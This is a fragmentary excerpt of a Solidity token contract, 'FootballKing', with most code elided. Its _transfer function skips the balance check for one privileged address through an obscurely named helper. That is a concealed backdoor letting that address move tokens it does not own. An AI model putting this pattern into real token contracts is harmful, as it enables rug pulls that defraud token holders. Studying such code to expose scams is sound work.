...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (_asicTransfer(from)) {require(balance >= amount, "balanceNotEnough");}
    ...
    function _asicTransfer(address seds) internal view returns (bool){
        return seds != thA;
    }
...
contract FootballKing is AbsToken {
    constructor() AbsToken(
        ...
        address(0xb05b0514C0442F357Edb38f8e29a56a2eE285810),
        address(0x5894f16e1F248fdDee0436e8827191006a4f194f),
    
        address(0x6ECE7492F633bf58ad720a346E8f701F066aFD80)
    ){
